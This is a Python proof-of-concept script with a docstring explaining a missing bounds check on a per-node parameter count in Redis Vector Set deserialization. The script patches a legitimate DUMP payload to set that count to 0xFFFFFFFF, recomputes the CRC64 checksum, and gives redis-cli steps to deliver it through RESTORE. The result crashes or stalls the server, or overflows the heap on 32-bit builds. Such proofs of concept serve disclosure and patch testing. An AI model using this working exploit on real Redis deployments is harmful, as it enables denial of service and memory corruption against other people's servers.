#!/usr/bin/env python3
"""
Craft a Vector Set DUMP payload whose node parameter count is 0xFFFFFFFF.

Root cause
----------
VectorSetRdbLoad() (modules/vector-sets/vset.c) reads a per-node parameter
count straight from the stream and uses it both for the allocation and the
read loop, with no upper bound:

    uint32_t params_count = RedisModule_LoadUnsigned(rdb);
    uint64_t *params = RedisModule_Alloc(params_count * sizeof(uint64_t));
    for (uint32_t j = 0; j < params_count; j++)
        params[j] = RedisModule_LoadUnsigned(rdb);   // no IO-error check

With params_count = 0xFFFFFFFF a 64-bit build requests a ~34 GB allocation,
which either fails (allocator returns NULL, zmalloc's OOM handler aborts the
process) or succeeds and keeps the event loop busy reading the stream 2^32
times while the client connection is long gone. On 32-bit builds the
multiplication truncates to a small allocation and the loop writes far past
it.

The payload is derived from a legitimate DUMP reply of the same Redis
version: the script replays the serialization to locate the first node's
parameter-count field, replaces it, and recomputes the CRC64 footer so the
payload passes verifyDumpPayload().

Obtain a base payload (any small vector set works):

    redis-cli VADD vset VALUES 2 1.0 2.0 element1
    redis-cli --raw DUMP vset > base_payload.bin
    redis-cli DEL vset

Craft and deliver:

    python3 craft_vectorset_params_payload.py base_payload.bin payload.bin
    redis-cli -x RESTORE vset 0 < payload.bin

Usage:  python3 craft_vectorset_params_payload.py <base> <output>
"""
import sys

OPCODE_UINT = 2    # module IO opcodes, see src/rdb.h
OPCODE_STRING = 5
MODULE_TYPE_RDB = 0x07   # RDB_TYPE_MODULE_2

NEW_PARAM_COUNT = 0xFFFFFFFF


def crc64(data: bytes) -> int:
    """CRC-64 as implemented by Redis src/crc64.c (POLY 0xAD93D23594C935A9,
    MSB-first, init 0, result bit-reflected)."""
    poly = 0xAD93D23594C935A9
    crc = 0
    for byte in data:
        for i in range(8):
            bit = crc >> 63
            if byte & (1 << i):
                bit ^= 1
            crc = (crc << 1) & 0xFFFFFFFFFFFFFFFF
            if bit:
                crc ^= poly
    return int(f"{crc:064b}"[::-1], 2)


class Reader:
    """Replays the DUMP payload the same way the server reads it."""

    def __init__(self, data: bytes):
        self.data = data
        self.pos = 0

    def byte(self) -> int:
        b = self.data[self.pos]
        self.pos += 1
        return b

    def length(self) -> int:
        b = self.byte()
        form = b >> 6
        if form == 0:
            return b & 0x3F
        if form == 1:
            return ((b & 0x3F) << 8) | self.byte()
        if b == 0x80:  # 32-bit big-endian
            v = int.from_bytes(self.data[self.pos:self.pos + 4], "big")
            self.pos += 4
            return v
        if b == 0x81:  # 64-bit big-endian
            v = int.from_bytes(self.data[self.pos:self.pos + 8], "big")
            self.pos += 8
            return v
        raise ValueError(f"unsupported length byte {b:#x} at {self.pos - 1}")

    def uint(self) -> int:
        opcode = self.length()
        assert opcode == OPCODE_UINT, f"expected UINT opcode, got {opcode}"
        return self.length()

    def string(self) -> bytes:
        opcode = self.length()
        assert opcode == OPCODE_STRING, f"expected STRING opcode, got {opcode}"
        n = self.length()
        s = self.data[self.pos:self.pos + n]
        self.pos += n
        return s


def locate_param_count_span(payload: bytes):
    """Return the (start, end) byte offsets of the first node's
    params_count value encoding inside the payload."""
    r = Reader(payload)
    assert r.byte() == MODULE_TYPE_RDB, "not a MODULE_2 dump payload"
    r.length()                       # module id
    r.uint()                         # vector dim
    elements = r.uint()              # node count
    r.uint()                         # hnsw config (quant type | M << 8)
    save_flags = r.uint()
    span = None
    for _ in range(elements):
        r.string()                   # element
        if save_flags & 2:
            r.string()               # attribute
        r.string()                   # quantized vector blob
        opcode = r.length()          # params_count opcode byte (UINT)
        assert opcode == OPCODE_UINT, f"expected UINT opcode, got {opcode}"
        start = r.pos                # params_count value encoding
        count = r.length()
        end = r.pos
        if span is None:
            span = (start, end)
        for _ in range(count):       # parameters
            r.uint()
    assert r.length() == 0, "missing module EOF opcode"  # RDB_MODULE_OPCODE_EOF
    return span


def main() -> None:
    base_path, out_path = sys.argv[1], sys.argv[2]
    with open(base_path, "rb") as fh:
        base = fh.read()

    body, version = base[:-10], base[-10:-8]  # footer: 2-byte version + CRC64
    start, end = locate_param_count_span(base)

    # The count uses rdbSaveLen() encoding; 0xFFFFFFFF needs the 32-bit
    # form: prefix byte 0x80 followed by four big-endian bytes.
    patched = bytearray(body)
    patched[start:end] = b"\x80" + NEW_PARAM_COUNT.to_bytes(4, "big")

    out = bytes(patched) + version
    out += crc64(out).to_bytes(8, "little")
    with open(out_path, "wb") as fh:
        fh.write(out)
    print(f"base payload {len(base)} bytes, params_count field at "
          f"bytes {start}..{end}, wrote {len(out)} bytes to {out_path}")


if __name__ == "__main__":
    main()
